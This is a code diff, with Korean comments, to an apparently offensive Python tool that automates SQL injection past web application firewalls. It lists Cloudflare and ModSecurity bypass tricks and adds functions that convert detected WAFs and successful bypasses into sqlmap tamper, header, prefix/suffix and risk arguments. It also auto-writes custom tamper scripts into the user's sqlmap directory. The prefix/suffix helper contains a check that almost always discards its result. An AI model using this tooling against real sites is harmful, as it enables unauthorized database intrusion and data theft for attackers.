@@ -497,7 +497,7 @@ Nginx/OpenResty WAF (406 Not Acceptable) 우회 전략:
             "cloudflare": """
 Cloudflare WAF 우회 전략:
 1. URL 더블 인코딩: %27 → %2527
-2. Unicode 변형: SELECT → \uSELECT
+2. Unicode 변형: SELECT → U+0053ELECT
 3. Case mixing: SeLeCt
 4. 인라인 주석: UN/**/ION SE/**/LECT
 5. 느린 전송 (chunked transfer)
@@ -522,3 +522,189 @@ ModSecurity WAF 우회 전략:
 6. HEX 인코딩: 0x41 대신 A""",
         }
         return summaries.get(waf_type, summaries["generic"])
+
+    # ── sqlmap tamper 스크립트에 대응하는 변환 함수 맵 ────────────────
+    # bingo 우회 기법 → sqlmap tamper 이름 (없으면 커스텀 생성)
+    _TECHNIQUE_TO_TAMPER: dict[str, list[str]] = {
+        "space":        ["space2comment", "space2mysqlblank"],
+        "newline":      ["space2comment"],
+        "mysql_comment":["space2comment"],
+        "keyword":      ["randomcase", "between"],
+        "case":         ["randomcase"],
+        "encoding":     ["charencode", "percentage"],
+        "encode":       ["charencode"],
+        "double":       ["chardoubleencode"],
+        "unicode":      ["charunicodeencode"],
+        "combined":     ["space2comment", "between", "charencode", "randomcase"],
+    }
+
+    def to_sqlmap_args(
+        self,
+        waf_result: "WafDetectResult",
+        bypass_attempt: "BypassAttempt | None",
+    ) -> str:
+        """
+        WAF 탐지 + 우회 성공 결과를 sqlmap 명령 인자로 변환.
+        - 알려진 기법 → tamper 스크립트 이름
+        - 알 수 없는 커스텀 기법 → tamper 스크립트 자동 생성 후 경로 포함
+        반환값: sqlmap에 붙일 추가 인자 문자열
+        """
+        args: list[str] = []
+        tampers: list[str] = []
+
+        waf_lower = (waf_result.waf_type or "").lower()
+
+        # WAF 종류별 기본 tamper
+        if "cloudflare" in waf_lower:
+            tampers += ["space2comment", "between", "charencode", "randomcase"]
+        elif "aws" in waf_lower:
+            tampers += ["space2mysqlblank", "equaltolike", "greatest"]
+        elif "modsecurity" in waf_lower or "mod_security" in waf_lower:
+            tampers += ["space2comment", "between", "modsecurityversioned"]
+        elif "akamai" in waf_lower:
+            tampers += ["space2comment", "between", "charencode"]
+        else:
+            tampers += ["space2comment", "between", "charencode"]
+
+        if bypass_attempt:
+            tech = bypass_attempt.technique.lower()
+
+            # 알려진 기법 → tamper 이름 매핑
+            matched = False
+            for key, mapped_tampers in self._TECHNIQUE_TO_TAMPER.items():
+                if key in tech:
+                    for t in mapped_tampers:
+                        if t not in tampers:
+                            tampers.append(t)
+                    matched = True
+
+            # 헤더 기반 우회 → --headers 로 직접 전달
+            if "header" in tech and bypass_attempt.headers_used:
+                header_str = "\\n".join(
+                    f"{k}: {v}" for k, v in bypass_attempt.headers_used.items()
+                )
+                args.append(f'--headers="{header_str}"')
+
+            if "ua" in tech:
+                args.append("--random-agent")
+
+            # 알 수 없는 커스텀 기법 → tamper 스크립트 자동 생성 (방법 2)
+            if not matched and "header" not in tech and "ua" not in tech:
+                custom_path = self._generate_custom_tamper(bypass_attempt)
+                if custom_path:
+                    tampers.append(str(custom_path))
+
+            # 방법 1: prefix/suffix — 성공한 실제 페이로드의 변환 패턴 반영
+            if bypass_attempt.payload_original and bypass_attempt.payload_modified:
+                orig = bypass_attempt.payload_original
+                modified = bypass_attempt.payload_modified
+                # 앞/뒤 공통 부분 추출해서 prefix/suffix 계산
+                prefix, suffix = self._extract_prefix_suffix(orig, modified)
+                if prefix:
+                    args.append(f'--prefix="{prefix}"')
+                if suffix:
+                    args.append(f'--suffix="{suffix}"')
+
+        if tampers:
+            args.append(f"--tamper={','.join(tampers)}")
+
+        # 공통 안전 옵션
+        args += ["--delay=2", "--random-agent", "--level=3", "--risk=2", "--batch"]
+
+        return " ".join(args)
+
+    def _generate_custom_tamper(self, attempt: "BypassAttempt") -> "Path | None":
+        """
+        sqlmap tamper 스크립트에 없는 커스텀 우회 기법을
+        Python tamper 스크립트로 자동 생성 → ~/.sqlmap/tamper/ 에 저장
+        """
+        import hashlib
+        import re as _re
+        from pathlib import Path
+
+        orig = attempt.payload_original
+        modified = attempt.payload_modified
+        if not orig or not modified or orig == modified:
+            return None
+
+        # 변환 패턴 분석
+        transforms: list[str] = []
+
+        # 공백 치환 감지
+        orig_spaces = orig.count(" ")
+        if orig_spaces > 0:
+            # 공백이 무엇으로 바뀌었는지 추출
+            sample_replacement = None
+            for i, (a, b) in enumerate(zip(orig, modified)):
+                if a == " " and b != " ":
+                    # 치환된 문자열 길이 추정
+                    end = i + 1
+                    while end < len(modified) and modified[end] not in orig:
+                        end += 1
+                    sample_replacement = modified[i:end]
+                    break
+            if sample_replacement:
+                escaped = repr(sample_replacement)
+                transforms.append(
+                    f'        payload = payload.replace(" ", {escaped})'
+                )
+
+        # URL 인코딩 감지 (%xx)
+        if _re.search(r"%[0-9A-Fa-f]{2}", modified) and "%" not in orig:
+            transforms.append(
+                "        import urllib.parse\n"
+                "        payload = urllib.parse.quote(payload, safe='=&')"
+            )
+
+        if not transforms:
+            return None
+
+        body = "\n".join(transforms)
+        script_name = "bingo_custom_" + hashlib.md5(modified.encode()).hexdigest()[:8]
+        script_code = f'''#!/usr/bin/env python
+"""
+Auto-generated by bingo WAF bypass engine.
+Technique: {attempt.technique}
+"""
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+
+def dependencies():
+    pass
+
+
+def tamper(payload, **kwargs):
+    if payload:
+{body}
+    return payload
+'''
+        tamper_dir = Path.home() / ".sqlmap" / "tamper"
+        tamper_dir.mkdir(parents=True, exist_ok=True)
+        script_path = tamper_dir / f"{script_name}.py"
+        script_path.write_text(script_code, encoding="utf-8")
+        return script_path
+
+    def _extract_prefix_suffix(
+        self, original: str, modified: str
+    ) -> tuple[str, str]:
+        """변환된 페이로드에서 prefix/suffix 패턴 추출"""
+        # 공통 앞부분
+        prefix = ""
+        for i, (a, b) in enumerate(zip(original, modified)):
+            if a == b:
+                prefix += a
+            else:
+                break
+        # 공통 뒷부분
+        suffix = ""
+        for a, b in zip(reversed(original), reversed(modified)):
+            if a == b:
+                suffix = a + suffix
+            else:
+                break
+        # 원본과 동일하면 의미 없음
+        if prefix == original[:len(prefix)] and suffix == original[-len(suffix):]:
+            return "", ""
+        return prefix, suffix
